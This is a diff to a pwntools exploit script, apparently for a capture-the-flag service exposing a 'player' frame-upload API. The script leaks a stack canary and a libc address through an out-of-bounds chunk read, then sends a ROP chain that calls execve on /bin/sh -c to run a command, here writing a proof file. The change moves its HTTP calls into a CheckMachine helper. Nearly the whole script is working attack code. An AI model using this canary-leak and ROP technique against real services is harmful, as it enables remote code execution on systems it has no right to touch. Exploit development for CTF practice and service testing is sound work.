@@ -1,7 +1,12 @@
-from base64 import b64decode, b64encode
-
-import requests
 from pwn import *
+
+from player_lib import *
+
+host = sys.argv[1]
+
+mch = CheckMachine(host)
+u, p = mch.register_user()
+sess = mch.login_user(u, p)
 
 
 def decode(s):
@@ -11,27 +16,17 @@ def decode(s):
     return result
 
 
-token = requests.get('http://0.0.0.0:8000/api/player/init_upload').json()['token']
-
 payload_leak = p64(64) + b"A" * 8 + b"\x00"
 
-r = requests.post(
-    f'http://0.0.0.0:8000/api/player/upload_chunk/{token}',
-    json={
-        'start': 0,
-        'frames': [b64encode(payload_leak).decode()]
-    }
-)
+token = mch.upload_frames(sess, 'kek', [payload_leak])
 
-r = requests.get(
-    f'http://0.0.0.0:8000/api/player/get_chunk/{token}?start=0&end=0',
-)
+resp = mch.get_frames(sess, token, 0, 0)[0]
 
-resp = r.json()["response"][0]
-
-resp = b64decode(resp.encode())
 resp = decode(resp[8:])
 canary = resp[24:32]
+
+print(resp)
+print(canary)
 
 leak = u64(resp[-8:])
 
@@ -66,7 +61,8 @@ cmd = pad(b'/bin/sh\x00')
 argv = [
     pad(b'/bin/sh\x00'),
     pad(b'-c\x00'),
-    pad(f'ls /anime > /anime/{token}/0.frame\x00'.encode()),
+    # pad(f'ls /anime > /anime/{token}/1.frame\x00'.encode()),
+    pad(f'echo "kek" > /tmp/proof\x00'.encode()),
 ]
 
 rop = b""
@@ -99,13 +95,9 @@ rop += syscall
 
 payload_rce = p64(56 + len(rop)) + b"A" * 8 + b"\x00" + b"B" * 15 + canary + b"C" * 24 + rop
 
-r = requests.post(
-    f'http://0.0.0.0:8000/api/player/parse_chunk/',
-    json={
-        'frames': [b64encode(payload_rce).decode()]
-    }
-)
+mch.parse_frames(sess, [payload_rce])
+print(mch.get_frames(sess, token, 1, 1))
 
-r = requests.get(f'http://0.0.0.0:8000/api/player/get_chunk/{token}/?start=0&end=0')
-data = b64decode(r.json()['response'][0].encode()).decode().split('\n')
-print(data)
+# r = requests.get(f'http://0.0.0.0:8000/api/player/get_chunk/{token}/?start=0&end=0')
+# data = b64decode(r.json()['response'][0].encode()).decode().split('\n')
+# print(data)
